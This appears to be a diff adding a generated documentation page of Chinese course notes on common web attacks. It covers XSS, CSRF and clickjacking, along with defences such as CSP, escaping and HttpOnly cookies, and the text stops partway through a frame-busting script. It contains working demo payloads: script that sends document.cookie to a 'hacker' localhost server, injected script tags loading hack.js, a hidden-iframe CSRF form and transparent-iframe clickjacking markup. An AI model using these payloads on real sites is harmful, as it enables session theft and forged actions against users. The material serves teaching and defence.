+      <a href="../../other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%AD%E5%8D%B7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    精读-你不知道的JS中卷
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/%E7%B2%BE%E8%AF%BB-%E5%9B%BE%E8%A7%A3HTTP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    精读-图解HTTP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/%E7%B2%BE%E8%AF%BB-%E9%AB%98%E6%80%A7%E8%83%BDJS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    精读-高性能JS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    计算机是怎样跑起来的
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      课堂⽬标
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      知识要点
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="知识要点">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      1、XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS攻击分类
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-scripting" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS攻击的危害 - Scripting能干啥就能干啥
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS 防范⼿段
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS 防范⼿段">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#head" class="md-nav__link">
+    <span class="md-ellipsis">
+      HEAD
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csp" class="md-nav__link">
+    <span class="md-ellipsis">
+      CSP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      转义字符
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      黑名单
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      ⽩名单
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#httponly-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      HttpOnly Cookie
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      2、CSRF
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2、CSRF">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      CSRF攻击危害
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      防御
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-clickjacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      3、点击劫持 - clickjacking
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3、点击劫持 - clickjacking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      防御
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL注⼊
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL注⼊">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      防御
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#os" class="md-nav__link">
+    <span class="md-ellipsis">
+      OS注⼊
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      请求劫持
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ddos" class="md-nav__link">
+    <span class="md-ellipsis">
+      DDOS
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="web">常见Web攻击<a class="headerlink" href="#web" title="Permanent link">&para;</a></h1>
+<p>统计信息：字数 15049  阅读31分钟</p>
+<h2 id="_1">课堂⽬标<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>掌握XSS (实施 + 防御) </p>
+<p>掌握CSRF (实施 + 防御) </p>
+<p>掌握点击劫持 (实施 + 防御) </p>
+<p>掌握SQL注⼊ (实施 + 防御) </p>
+<p>掌握OS注⼊ (实施 + 防御) </p>
+<p>了解请求劫持</p>
+<p>了解DDOS</p>
+<h2 id="_2">知识要点<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="1xss">1、XSS<a class="headerlink" href="#1xss" title="Permanent link">&para;</a></h3>
+<p>XSS 攻击的基本逻辑：在 URL 中插入一段 script 脚本，然后脚本的 src 设置成另一个网址（黑客网址）或者设置一段 JS 代码，然后插入一张图片，图片的 src 中包括当前用户的登录信息（document.cookie）这样在黑客平台上可以获取到用户的 cookie，然后可以直接登录用户的账户。图片通常会加载，所以写入图片的 src 中。 <code>&lt;img src="http://localhost:4000?test:${document.cookie}"/&gt;</code> 类似这样的脚本。</p>
+<p>黑客发给别人一个网址，然后点击网址进入的界面中，就可能有非法的脚本。</p>
+<p>Cross Site Scripting 跨站脚本攻击</p>
+<p>XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS重叠，所以只能叫 XSS。跨站脚本攻 击是指通过存在安全漏漏洞洞的Web⽹网站注册⽤户的浏览器器内运⾏⾮非法的⾮非本站点HTML标签或 JavaScript进⾏的⼀一种攻击。</p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">img</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">();</span>
+<span class="nx">img</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://localhost:4000/img?c=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+</code></pre></div>
+<p>加入这段代码后，会将浏览器的 cookie 获取到，然后图片会请求 4000 端口（黑客端口）可以解析一下获取到 cookie，黑客就可以进行正常的登录了</p>
+<div class="highlight"><pre><span></span><code><span class="nx">localhost</span><span class="o">:</span><span class="mf">3000</span><span class="o">/?</span><span class="kr">from</span><span class="o">=&lt;</span><span class="nx">script</span><span class="o">%</span><span class="mf">20</span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;http://localhost:4000/hack.js&quot;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<p>跨站脚本攻击有可能造成以下影响:</p>
+<p>利利⽤虚假输⼊表单骗取⽤户个⼈人信息。</p>
+<p>利⽤脚本窃取⽤户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</p>
+<p>显示伪造的⽂章或图片。</p>
+<h3 id="xss">XSS攻击分类<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h3>
+<ul>
+<li>反射型 - url参数直接注⼊（攻击一个用户的账户）</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="c1">// 普通</span>
+<span class="nx">http</span><span class="o">:</span><span class="c1">//localhost:3000/?from=china</span>
+
+<span class="c1">// alert尝试</span>
+<span class="nx">http</span><span class="o">:</span><span class="c1">//localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt;</span>
+
+<span class="c1">// 获取Cookie</span>
+<span class="nx">http</span><span class="o">:</span><span class="c1">//localhost:3000/?from=&lt;script src=&quot;http://localhost:4000/hack.js&quot;&gt; &lt;/script&gt;</span>
+
+<span class="c1">// 短域名伪造(用户无法直接看清楚原来的长网站中是否有 script 标签)</span>
+<span class="nx">https</span><span class="o">:</span><span class="c1">//dwz.cn/console/operation 百度随便搜索就有</span>
+
+<span class="c1">// 伪造 cookie ⼊侵 chrome </span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s2">&quot;kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUz NTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0=&quot;</span>
+</code></pre></div>
+<ul>
+<li>存储型 （直接攻击数据库，然后其他人执行时会直接发布） 黑客输入一个含有病毒的评论，存储到DB后，其他正常用户读取时中毒，获取用户的浏览器 cookie，然后继续传播</li>
+</ul>
+<div class="highlight"><pre><span></span><code>// 评论
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+
+// 跨站脚本注⼊
+我来了<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://localhost:4000/hack.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="xss-scripting">XSS攻击的危害 - Scripting能干啥就能干啥<a class="headerlink" href="#xss-scripting" title="Permanent link">&para;</a></h3>
+<p>获取⻚面数据 获取Cookies 劫持前端逻辑</p>
+<p>发送请求</p>
+<p>偷取网站的任意数据</p>
+<p>偷取⽤户的资料</p>
+<p>偷取⽤户的秘密和登录态</p>
+<p>欺骗⽤户</p>
+<h3 id="xss_1">XSS 防范⼿段<a class="headerlink" href="#xss_1" title="Permanent link">&para;</a></h3>
+<h4 id="head">HEAD<a class="headerlink" href="#head" title="Permanent link">&para;</a></h4>
+<p>0 禁止XSS过滤</p>
+<p>1 启⽤XSS过滤(通常浏览器器是默认的)。 如果检测到跨站脚本攻击，浏览器器将清除⻚页⾯面(删除不不 安全的部分)</p>
+<div class="highlight"><pre><span></span><code><span class="nx">ctx</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;X-XSS-Protection&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="c1">// 禁⽌止XSS过滤</span>
+<span class="c1">// http://localhost:3000/?from=&lt;script&gt;alert(3)&lt;/script&gt; 可以拦截 但伪装一下就不⾏ 了</span>
+</code></pre></div>
+<p>1;mode=block 启⽤XSS过滤。 如果检测到攻击，浏览器器将不不会清除⻚页⾯面，⽽而是阻⽌止⻚页⾯面加载。 1; report= (Chromium only)</p>
+<p>启⽤XSS过滤。 如果检测到跨站脚本攻击，浏览器器将清除⻚页⾯面并使⽤CSP report-uri 指令的功 能发送违规报告。</p>
+<h4 id="csp">CSP<a class="headerlink" href="#csp" title="Permanent link">&para;</a></h4>
+<p>内容安全策略略 (CSP, Content Security Policy) 是⼀一个附加的安全层，⽤于帮助检测和缓解某 些类型的攻击，包括跨站脚本 (XSS) 和数据注⼊等攻击。 这些攻击可⽤于实现从数据窃取到 ⽹网站破坏或作为恶意软件分发版本等⽤途。</p>
+<p>CSP 本质上就是建⽴立⽩名单，开发者明确告诉浏览器器哪些外部资源可以加载和执⾏。我们只 需要配置规则，如何拦截是由浏览器器⾃自⼰己实现的。我们可以通过这种⽅式来尽量量减少 XSS 攻 击。</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 只允许加载本站资源</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Security</span><span class="o">-</span><span class="nx">Policy</span><span class="o">:</span><span class="w"> </span><span class="k">default</span><span class="o">-</span><span class="nx">src</span><span class="w"> </span><span class="s1">&#39;self&#39;</span>
+
+<span class="c1">// 只允许加载 HTTPS 协议图⽚</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Security</span><span class="o">-</span><span class="nx">Policy</span><span class="o">:</span><span class="w"> </span><span class="nx">img</span><span class="o">-</span><span class="nx">src</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//*</span>
+
+<span class="c1">// 不不允许加载任何来源框架</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Security</span><span class="o">-</span><span class="nx">Policy</span><span class="o">:</span><span class="w"> </span><span class="nx">child</span><span class="o">-</span><span class="nx">src</span><span class="w"> </span><span class="s1">&#39;none&#39;</span>
+
+<span class="nx">ctx</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;default-src &#39;self&#39;&quot;</span><span class="p">)</span>
+<span class="c1">// 尝试⼀一下外部资源不不能加载</span>
+<span class="nx">http</span><span class="o">:</span><span class="c1">//localhost:3000/?from=&lt;script src=&quot;http://localhost:4000/hack.js&quot;&gt; &lt;/script&gt;</span>
+</code></pre></div>
+<h4 id="_3">转义字符<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
+<p>ejs转义⼩知识</p>
+<div class="highlight"><pre><span></span><code>&lt;% code %&gt;⽤于执⾏其中javascript代码;
+&lt;%= code %&gt;会对code进⾏html转义;
+&lt;%- code %&gt;将不不会进⾏转义
+</code></pre></div>
+<h4 id="_4">黑名单<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
+<p>⽤户的输⼊永远不可信任的，最普遍的做法就是转义输⼊输出的内容，对于引号、尖括号、斜杠
+进⾏转义</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">escape</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;/g</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&amp;amp;&#39;</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;/g</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&amp;lt;&#39;</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&gt;/g</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&amp;gt;&#39;</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&quot;/g</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&amp;quto;&#39;</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&#39;/g</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&amp;#39;&#39;</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/`/g</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&amp;#96;&#39;</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\//g</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&amp;#x2F;&#39;</span><span class="p">)</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">str</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>富⽂本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对
+ 于这种情况，通常采⽤⽩名单过滤的办法，当然也可以通过⿊黑名单过滤，但是考虑到需要过滤的
+ 标签和标签属性实在太多，更加推荐使⽤⽩名单的⽅式。</p>
+<h4 id="_5">⽩名单<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">xss</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;xss&#39;</span><span class="p">)</span>
+<span class="kd">let</span><span class="w"> </span><span class="nx">html</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">xss</span><span class="p">(</span><span class="s1">&#39;&lt;h1 id=&quot;title&quot;&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&#39;</span><span class="p">)</span>
+<span class="c1">// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert(&quot;xss&quot;);&amp;lt;/script&amp;gt;</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span>
+</code></pre></div>
+<h4 id="httponly-cookie">HttpOnly Cookie<a class="headerlink" href="#httponly-cookie" title="Permanent link">&para;</a></h4>
+<p>这是预防XSS攻击窃取⽤户cookie最有效的防御⼿段。Web应 ⽤程序在设置cookie时，将其 属性设为HttpOnly，就可以避免该⽹网⻚页的cookie被客户端恶意JavaScript窃取，保护⽤户 cookie 信息。</p>
+<div class="highlight"><pre><span></span><code><span class="nx">response</span><span class="p">.</span><span class="nx">addHeader</span><span class="p">(</span><span class="s2">&quot;Set-Cookie&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;uid=112; Path=/; HttpOnly&quot;</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="2csrf">2、CSRF<a class="headerlink" href="#2csrf" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>CSRF(Cross Site Request Forgery)，即跨站请求伪造，是⼀一种常⻅见的Web攻击，它利⽤⽤户已登录的身份，在⽤户毫不知情的情况下，以⽤户的名义完成⾮法操作。</p>
+</blockquote>
+<ul>
+<li>⽤户已经登录了站点 A，并在本地记录了 cookie</li>
+<li>在⽤户没有登出站点 A 的情况下(也就是 cookie ⽣生效的情况下)，访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。</li>
+<li>站点 A 没有做任何 CSRF 防御</li>
+</ul>
+<p>登录 <a href="http://localhost:4000/csrf.html">http://localhost:4000/csrf.html</a> 主要使用 iframe 嵌套另一个页面</p>
+<div class="highlight"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="sb">`</span>
+<span class="sb">    &lt;form name=&quot;form&quot; action=&quot;http://3000/updateText&quot; method=&quot;post&quot; target=&quot;csrf&quot;&gt;</span>
+<span class="sb">        添加评论: &lt;input type=&quot;text&quot; name=&quot;text&quot; value=&quot;comment&quot;/&gt;</span>
+<span class="sb">    &lt;/form&gt;</span>
+<span class="sb">`</span><span class="p">)</span>
+
+<span class="kd">var</span><span class="w"> </span><span class="nx">iframe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;csrf&#39;</span><span class="p">;</span>
+<span class="nx">iframe</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;none&#39;</span><span class="p">;</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iframe</span><span class="p">);</span>
+
+<span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="nx">form</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
+<span class="p">},</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
+</code></pre></div>
+<p>用户点开这个链接后，已经在 3000 网站上登录，不知情的情况下（iframe 不显示），那么就会给 3000 网站上发出一个评论，评论的内容会发送到 3000 上面，造成虚假的评论。或者评论内部有其他非法代码，其他用户在 3000 上看到这个评论，就会获取其他用户的信息。或者在评论中插入4000的链接，诱导其他用户点击4000链接。</p>
+<p>这个表单提交后，target 需要设置一下，不会跳转到其他页面，用户不知不觉中提交了表单</p>
+<p>所以某些服务端会判断当前提交的是 iframe 还是 window，或者只允许自己的域下的页面提交表单或者评论。</p>
+<h4 id="csrf">CSRF攻击危害<a class="headerlink" href="#csrf" title="Permanent link">&para;</a></h4>
+<p>利⽤⽤户登录态
+⽤户不知情
+完成业务请求
+盗取⽤户资金(转账，消费)
+冒充⽤户发帖背锅
+损害⽹站声誉</p>
+<h4 id="_6">防御<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<ul>
+<li>禁⽌止第三⽅⽹网站带Cookie - 有兼容性问题 Referer Check - Https不不发送referer</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">next</span><span class="p">()</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">referer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">header</span><span class="p">.</span><span class="nx">referer</span>
+<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Referer:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">referer</span><span class="p">)</span>
+<span class="p">})</span>
+</code></pre></div>
+<ul>
+<li>验证码</li>
+<li>Cookie 值进行hash</li>
+</ul>
+<h3 id="3-clickjacking">3、点击劫持 - clickjacking<a class="headerlink" href="#3-clickjacking" title="Permanent link">&para;</a></h3>
+<p>点击劫持是⼀一种视觉欺骗的攻击⼿段。攻击者将需要攻击的⽹网站通过 iframe 嵌套的⽅式嵌⼊⾃⼰的网页中，并将 iframe 设置为透明，在⻚页⾯面中透出⼀一个按钮诱导⽤户点击。</p>
+<p>登录 <a href="http://localhost:4000/clickjacking.html">http://localhost:4000/clickjacking.html</a></p>
+<p>我们在页面中注入一个 iframe，然后设置透明，用户无法看到。然后在弄一个图片（美女或者抢红包）用户会点击这个图片，实际上点击的是 iframe 中的内容（例如投票按钮），这样用户就被点击劫持了。</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">button</span><span class="p">&gt;</span>点我领红包<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;./red-pocket.png&quot;</span><span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://localhost:3000&quot;</span> <span class="na">scrolling</span><span class="o">=</span><span class="s">&quot;no&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="nt">iframe</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">opacity</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nt">button</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">position</span><span class="p">:</span><span class="w"> </span><span class="kc">absolute</span><span class="p">;</span>
+<span class="w">  </span><span class="k">top</span><span class="p">:</span><span class="w"> </span><span class="n">xxx</span><span class="p">;</span>
+<span class="w">  </span><span class="k">left</span><span class="p">:</span><span class="w"> </span><span class="n">xxx</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<h4 id="_7">防御<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h4>
+<ul>
+<li>X-FRAME-OPTIONS是⼀一个 HTTP 响应头，在现代浏览器器有⼀一个很好的⽀持。这个 HTTP 响应头 就是为了防御⽤ iframe 嵌套的点击劫持攻击。 该响应头有三个值可选，分别是DENY，表示⻚页⾯面不不允许通过 iframe 的⽅式展示 SAMEORIGIN，表示⻚页⾯面可以在相同域名下通过 iframe 的⽅式展示 ALLOW-FROM，表示⻚页⾯面可以在指定来源的 iframe 中展示</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="nx">ctx</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;X-FRAME-OPTIONS&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;DENY&#39;</span><span class="p">)</span>
+</code></pre></div>
+<ul>
+<li>JS⽅式，判断当时是否存在 iframe，如果存在 iframe，那么就把 iframe 当做现在的窗口，就不会显示攻击者的窗口了。</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">style</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;click-jack&quot;</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="nt">html</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="k">display</span><span class="p">:</span><span class="w"> </span><span class="kc">none</span><span class="w"> </span><span class="cp">!important</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="c1">// self 是自己 == window</span>
+<span class="w">    </span><span class="c1">// top 返回顶层窗口（浏览器窗口）</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">self</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">top</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="kd">var</span><span class="w"> </span><span class="nx">style</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;click-jack&#39;</span><span class="p">)</span>
+<span class="w">      </span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">style</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
